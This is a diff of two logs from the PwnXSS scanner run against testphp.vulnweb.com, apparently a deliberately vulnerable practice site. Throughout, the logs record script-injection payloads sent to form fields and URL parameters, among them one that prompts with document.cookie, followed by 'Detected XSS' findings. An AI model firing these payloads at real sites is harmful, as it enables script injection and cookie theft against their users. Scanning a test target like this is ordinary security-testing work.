@@ -1,447 +1,394 @@
-[[1;33m06:49:46[0m] [[1;32mINFO[0m] Starting PwnXSS...
+[[1;33m09:41:56[0m] [[1;32mINFO[0m] Starting PwnXSS...
 [1;37m***************
-[[1;33m06:49:46[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/
-[[1;33m06:49:47[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
-[[1;33m06:49:47[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/search.php?test=query
-[[1;33m06:49:47[0m] [[1;32mINFO[0m] Collecting form input key.....
-[[1;33m06:49:47[0m] [[1;32mINFO[0m] Form key name: [1;32msearchFor[0m value: [1;32m<script>alert(6000/3000)</script>
-[[1;33m06:49:47[0m] [[1;32mINFO[0m] Form key name: [1;32mgoButton[0m value: [1;32m<Submit Confirm>
-[[1;33m06:49:47[0m] [[1;32mINFO[0m] Sending payload (POST) method...
-[[1;33m06:49:48[0m] [[1;31mCRITICAL[0m] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query
-[[1;33m06:49:48[0m] [[1;31mCRITICAL[0m] Post data: {'searchFor': '<script>alert(6000/3000)</script>', 'goButton': 'goButton'}
+[[1;33m09:41:56[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com
+[[1;33m09:41:57[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
+[[1;33m09:41:57[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/search.php?test=query
+[[1;33m09:41:57[0m] [[1;32mINFO[0m] Collecting form input key.....
+[[1;33m09:41:57[0m] [[1;32mINFO[0m] Form key name: [1;32msearchFor[0m value: [1;32m<script>prompt(5000/200)</script>
+[[1;33m09:41:57[0m] [[1;32mINFO[0m] Form key name: [1;32mgoButton[0m value: [1;32m<Submit Confirm>
+[[1;33m09:41:57[0m] [[1;32mINFO[0m] Sending payload (POST) method...
+[[1;33m09:41:58[0m] [[1;31mCRITICAL[0m] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query
+[[1;33m09:41:58[0m] [[1;31mCRITICAL[0m] Post data: {'searchFor': '<script>prompt(5000/200)</script>', 'goButton': 'goButton'}
 [1;37m***************
-[[1;33m06:49:48[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/index.php
-[[1;33m06:49:49[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
-[[1;33m06:49:49[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/search.php?test=query
-[[1;33m06:49:49[0m] [[1;32mINFO[0m] Collecting form input key.....
-[[1;33m06:49:49[0m] [[1;32mINFO[0m] Form key name: [1;32msearchFor[0m value: [1;32m<script>prompt(document.cookie)</script>
-[[1;33m06:49:49[0m] [[1;32mINFO[0m] Form key name: [1;32mgoButton[0m value: [1;32m<Submit Confirm>
-[[1;33m06:49:49[0m] [[1;32mINFO[0m] Sending payload (POST) method...
-[[1;33m06:49:49[0m] [[1;31mCRITICAL[0m] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query
-[[1;33m06:49:49[0m] [[1;31mCRITICAL[0m] Post data: {'searchFor': '<script>prompt(document.cookie)</script>', 'goButton': 'goButton'}
+[[1;33m09:41:58[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/index.php
+[[1;33m09:41:59[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
+[[1;33m09:41:59[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/search.php?test=query
+[[1;33m09:41:59[0m] [[1;32mINFO[0m] Collecting form input key.....
+[[1;33m09:41:59[0m] [[1;32mINFO[0m] Form key name: [1;32msearchFor[0m value: [1;32m<script>console.log(5000/3000)</script>
+[[1;33m09:41:59[0m] [[1;32mINFO[0m] Form key name: [1;32mgoButton[0m value: [1;32m<Submit Confirm>
+[[1;33m09:41:59[0m] [[1;32mINFO[0m] Sending payload (POST) method...
+[[1;33m09:42:00[0m] [[1;31mCRITICAL[0m] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query
+[[1;33m09:42:00[0m] [[1;31mCRITICAL[0m] Post data: {'searchFor': '<script>console.log(5000/3000)</script>', 'goButton': 'goButton'}
 [1;37m***************
-[[1;33m06:49:50[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/categories.php
-[[1;33m06:49:50[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
-[[1;33m06:49:50[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/search.php?test=query
-[[1;33m06:49:50[0m] [[1;32mINFO[0m] Collecting form input key.....
-[[1;33m06:49:50[0m] [[1;32mINFO[0m] Form key name: [1;32msearchFor[0m value: [1;32m<script>prompt(document.cookie)</script>
-[[1;33m06:49:50[0m] [[1;32mINFO[0m] Form key name: [1;32mgoButton[0m value: [1;32m<Submit Confirm>
-[[1;33m06:49:50[0m] [[1;32mINFO[0m] Sending payload (POST) method...
-[[1;33m06:49:51[0m] [[1;31mCRITICAL[0m] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query
-[[1;33m06:49:51[0m] [[1;31mCRITICAL[0m] Post data: {'searchFor': '<script>prompt(document.cookie)</script>', 'goButton': 'goButton'}
-[[1;33m06:49:51[0m] [[1;33mWARNING[0m] Found link with query: [1;32mcat=1[0m Maybe a vuln XSS point
-[[1;33m06:49:51[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=<script>prompt(document.cookie)</script>
-[[1;33m06:49:51[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:49:51[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Eprompt(document.cookie)%3C/script%3E
-[[1;33m06:49:51[0m] [[1;33mWARNING[0m] Found link with query: [1;32mcat=2[0m Maybe a vuln XSS point
-[[1;33m06:49:51[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=<script>prompt(document.cookie)</script>
-[[1;33m06:49:51[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:49:52[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Eprompt(document.cookie)%3C/script%3E
-[[1;33m06:49:52[0m] [[1;33mWARNING[0m] Found link with query: [1;32mcat=3[0m Maybe a vuln XSS point
-[[1;33m06:49:52[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=<script>prompt(document.cookie)</script>
-[[1;33m06:49:52[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:49:52[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Eprompt(document.cookie)%3C/script%3E
-[[1;33m06:49:52[0m] [[1;33mWARNING[0m] Found link with query: [1;32mcat=4[0m Maybe a vuln XSS point
-[[1;33m06:49:52[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=<script>prompt(document.cookie)</script>
-[[1;33m06:49:52[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:49:52[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Eprompt(document.cookie)%3C/script%3E
+[[1;33m09:42:00[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/categories.php
+[[1;33m09:42:01[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
+[[1;33m09:42:01[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/search.php?test=query
+[[1;33m09:42:01[0m] [[1;32mINFO[0m] Collecting form input key.....
+[[1;33m09:42:01[0m] [[1;32mINFO[0m] Form key name: [1;32msearchFor[0m value: [1;32m<script>console.log(5000/3000)</script>
+[[1;33m09:42:01[0m] [[1;32mINFO[0m] Form key name: [1;32mgoButton[0m value: [1;32m<Submit Confirm>
+[[1;33m09:42:01[0m] [[1;32mINFO[0m] Sending payload (POST) method...
+[[1;33m09:42:02[0m] [[1;32mINFO[0m] Parameter page using (POST) payloads but not 100% yet...
+[[1;33m09:42:02[0m] [[1;33mWARNING[0m] Found link with query: [1;32mcat=1[0m Maybe a vuln XSS point
+[[1;33m09:42:02[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=<script>console.log(5000/3000)</script>
+[[1;33m09:42:02[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:02[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
+[[1;33m09:42:02[0m] [[1;33mWARNING[0m] Found link with query: [1;32mcat=2[0m Maybe a vuln XSS point
+[[1;33m09:42:02[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=<script>console.log(5000/3000)</script>
+[[1;33m09:42:02[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:03[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
+[[1;33m09:42:03[0m] [[1;33mWARNING[0m] Found link with query: [1;32mcat=3[0m Maybe a vuln XSS point
+[[1;33m09:42:03[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=<script>console.log(5000/3000)</script>
+[[1;33m09:42:03[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:04[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
+[[1;33m09:42:04[0m] [[1;33mWARNING[0m] Found link with query: [1;32mcat=4[0m Maybe a vuln XSS point
+[[1;33m09:42:04[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=<script>console.log(5000/3000)</script>
+[[1;33m09:42:04[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:05[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
 [1;37m***************
-[[1;33m06:49:53[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/listproducts.php?cat=1
-[[1;33m06:49:54[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
-[[1;33m06:49:54[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/search.php?test=query
-[[1;33m06:49:54[0m] [[1;32mINFO[0m] Collecting form input key.....
-[[1;33m06:49:54[0m] [[1;32mINFO[0m] Form key name: [1;32msearchFor[0m value: [1;32m<script>prompt(document.cookie)</script>
-[[1;33m06:49:54[0m] [[1;32mINFO[0m] Form key name: [1;32mgoButton[0m value: [1;32m<Submit Confirm>
-[[1;33m06:49:54[0m] [[1;32mINFO[0m] Sending payload (POST) method...
-[[1;33m06:49:54[0m] [[1;31mCRITICAL[0m] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query
-[[1;33m06:49:54[0m] [[1;31mCRITICAL[0m] Post data: {'searchFor': '<script>prompt(document.cookie)</script>', 'goButton': 'goButton'}
-[[1;33m06:49:54[0m] [[1;33mWARNING[0m] Found link with query: [1;32mpic=1[0m Maybe a vuln XSS point
-[[1;33m06:49:54[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/product.php?pic=<script>prompt(document.cookie)</script>
-[[1;33m06:49:54[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/product.php?pic=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:49:56[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
-[[1;33m06:49:56[0m] [[1;33mWARNING[0m] Found link with query: [1;32mfile=./pictures/1.jpg[0m Maybe a vuln XSS point
-[[1;33m06:49:56[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/showimage.php?file=<script>prompt(document.cookie)</script>
-[[1;33m06:49:56[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:49:57[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Eprompt(document.cookie)%3C/script%3E
-[[1;33m06:49:57[0m] [[1;33mWARNING[0m] Found link with query: [1;32martist=1[0m Maybe a vuln XSS point
-[[1;33m06:49:57[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=<script>prompt(document.cookie)</script>
-[[1;33m06:49:57[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:49:58[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
-[[1;33m06:49:58[0m] [[1;33mWARNING[0m] Found link with query: [1;32mcat=1[0m Maybe a vuln XSS point
-[[1;33m06:49:58[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=<script>prompt(document.cookie)</script>
-[[1;33m06:49:58[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:49:58[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Eprompt(document.cookie)%3C/script%3E
-[[1;33m06:49:58[0m] [[1;33mWARNING[0m] Found link with query: [1;32mpic=2[0m Maybe a vuln XSS point
-[[1;33m06:49:58[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/product.php?pic=<script>prompt(document.cookie)</script>
-[[1;33m06:49:58[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/product.php?pic=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:49:59[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
-[[1;33m06:49:59[0m] [[1;33mWARNING[0m] Found link with query: [1;32mfile=./pictures/2.jpg[0m Maybe a vuln XSS point
-[[1;33m06:49:59[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/showimage.php?file=<script>prompt(document.cookie)</script>
-[[1;33m06:49:59[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:49:59[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Eprompt(document.cookie)%3C/script%3E
-[[1;33m06:49:59[0m] [[1;33mWARNING[0m] Found link with query: [1;32martist=1[0m Maybe a vuln XSS point
-[[1;33m06:49:59[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=<script>prompt(document.cookie)</script>
-[[1;33m06:49:59[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:50:00[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
-[[1;33m06:50:00[0m] [[1;33mWARNING[0m] Found link with query: [1;32mcat=1[0m Maybe a vuln XSS point
-[[1;33m06:50:00[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=<script>prompt(document.cookie)</script>
-[[1;33m06:50:00[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:50:00[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Eprompt(document.cookie)%3C/script%3E
-[[1;33m06:50:00[0m] [[1;33mWARNING[0m] Found link with query: [1;32mpic=3[0m Maybe a vuln XSS point
-[[1;33m06:50:00[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/product.php?pic=<script>prompt(document.cookie)</script>
-[[1;33m06:50:00[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/product.php?pic=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:50:01[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
-[[1;33m06:50:01[0m] [[1;33mWARNING[0m] Found link with query: [1;32mfile=./pictures/3.jpg[0m Maybe a vuln XSS point
-[[1;33m06:50:01[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/showimage.php?file=<script>prompt(document.cookie)</script>
-[[1;33m06:50:01[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:50:01[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Eprompt(document.cookie)%3C/script%3E
-[[1;33m06:50:01[0m] [[1;33mWARNING[0m] Found link with query: [1;32martist=1[0m Maybe a vuln XSS point
-[[1;33m06:50:01[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=<script>prompt(document.cookie)</script>
-[[1;33m06:50:01[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:50:02[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
-[[1;33m06:50:02[0m] [[1;33mWARNING[0m] Found link with query: [1;32mcat=1[0m Maybe a vuln XSS point
-[[1;33m06:50:02[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=<script>prompt(document.cookie)</script>
-[[1;33m06:50:02[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:50:02[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Eprompt(document.cookie)%3C/script%3E
-[[1;33m06:50:02[0m] [[1;33mWARNING[0m] Found link with query: [1;32mpic=4[0m Maybe a vuln XSS point
-[[1;33m06:50:02[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/product.php?pic=<script>prompt(document.cookie)</script>
-[[1;33m06:50:02[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/product.php?pic=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:50:03[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
-[[1;33m06:50:03[0m] [[1;33mWARNING[0m] Found link with query: [1;32mfile=./pictures/4.jpg[0m Maybe a vuln XSS point
-[[1;33m06:50:03[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/showimage.php?file=<script>prompt(document.cookie)</script>
-[[1;33m06:50:03[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:50:03[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Eprompt(document.cookie)%3C/script%3E
-[[1;33m06:50:03[0m] [[1;33mWARNING[0m] Found link with query: [1;32martist=1[0m Maybe a vuln XSS point
-[[1;33m06:50:03[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=<script>prompt(document.cookie)</script>
-[[1;33m06:50:03[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:50:04[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
-[[1;33m06:50:04[0m] [[1;33mWARNING[0m] Found link with query: [1;32mcat=1[0m Maybe a vuln XSS point
-[[1;33m06:50:04[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=<script>prompt(document.cookie)</script>
-[[1;33m06:50:04[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:50:04[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Eprompt(document.cookie)%3C/script%3E
-[[1;33m06:50:04[0m] [[1;33mWARNING[0m] Found link with query: [1;32mpic=5[0m Maybe a vuln XSS point
-[[1;33m06:50:04[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/product.php?pic=<script>prompt(document.cookie)</script>
-[[1;33m06:50:04[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/product.php?pic=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:50:05[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
-[[1;33m06:50:05[0m] [[1;33mWARNING[0m] Found link with query: [1;32mfile=./pictures/5.jpg[0m Maybe a vuln XSS point
-[[1;33m06:50:05[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/showimage.php?file=<script>prompt(document.cookie)</script>
-[[1;33m06:50:05[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:50:06[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Eprompt(document.cookie)%3C/script%3E
-[[1;33m06:50:06[0m] [[1;33mWARNING[0m] Found link with query: [1;32martist=1[0m Maybe a vuln XSS point
-[[1;33m06:50:06[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=<script>prompt(document.cookie)</script>
-[[1;33m06:50:06[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:50:07[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
-[[1;33m06:50:07[0m] [[1;33mWARNING[0m] Found link with query: [1;32mcat=1[0m Maybe a vuln XSS point
-[[1;33m06:50:07[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=<script>prompt(document.cookie)</script>
-[[1;33m06:50:07[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:50:08[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Eprompt(document.cookie)%3C/script%3E
-[[1;33m06:50:08[0m] [[1;33mWARNING[0m] Found link with query: [1;32mpic=7[0m Maybe a vuln XSS point
-[[1;33m06:50:08[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/product.php?pic=<script>prompt(document.cookie)</script>
-[[1;33m06:50:08[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/product.php?pic=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:50:09[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
-[[1;33m06:50:09[0m] [[1;33mWARNING[0m] Found link with query: [1;32mfile=./pictures/7.jpg[0m Maybe a vuln XSS point
-[[1;33m06:50:09[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/showimage.php?file=<script>prompt(document.cookie)</script>
-[[1;33m06:50:09[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:50:09[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Eprompt(document.cookie)%3C/script%3E
-[[1;33m06:50:09[0m] [[1;33mWARNING[0m] Found link with query: [1;32martist=2[0m Maybe a vuln XSS point
-[[1;33m06:50:09[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=<script>prompt(document.cookie)</script>
-[[1;33m06:50:09[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:50:10[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
-[[1;33m06:50:10[0m] [[1;33mWARNING[0m] Found link with query: [1;32mcat=1[0m Maybe a vuln XSS point
-[[1;33m06:50:10[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=<script>prompt(document.cookie)</script>
-[[1;33m06:50:10[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:50:11[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Eprompt(document.cookie)%3C/script%3E
+[[1;33m09:42:06[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/artists.php
+[[1;33m09:42:06[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
+[[1;33m09:42:06[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/search.php?test=query
+[[1;33m09:42:06[0m] [[1;32mINFO[0m] Collecting form input key.....
+[[1;33m09:42:06[0m] [[1;32mINFO[0m] Form key name: [1;32msearchFor[0m value: [1;32m<script>console.log(5000/3000)</script>
+[[1;33m09:42:06[0m] [[1;32mINFO[0m] Form key name: [1;32mgoButton[0m value: [1;32m<Submit Confirm>
+[[1;33m09:42:06[0m] [[1;32mINFO[0m] Sending payload (POST) method...
+[[1;33m09:42:07[0m] [[1;31mCRITICAL[0m] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query
+[[1;33m09:42:07[0m] [[1;31mCRITICAL[0m] Post data: {'searchFor': '<script>console.log(5000/3000)</script>', 'goButton': 'goButton'}
+[[1;33m09:42:07[0m] [[1;33mWARNING[0m] Found link with query: [1;32martist=1[0m Maybe a vuln XSS point
+[[1;33m09:42:07[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=<script>console.log(5000/3000)</script>
+[[1;33m09:42:07[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:08[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
+[[1;33m09:42:08[0m] [[1;33mWARNING[0m] Found link with query: [1;32martist=2[0m Maybe a vuln XSS point
+[[1;33m09:42:08[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=<script>console.log(5000/3000)</script>
+[[1;33m09:42:08[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:08[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
+[[1;33m09:42:08[0m] [[1;33mWARNING[0m] Found link with query: [1;32martist=3[0m Maybe a vuln XSS point
+[[1;33m09:42:08[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=<script>console.log(5000/3000)</script>
+[[1;33m09:42:08[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:09[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
 [1;37m***************
-[[1;33m06:50:11[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/product.php?pic=1
-[[1;33m06:50:12[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
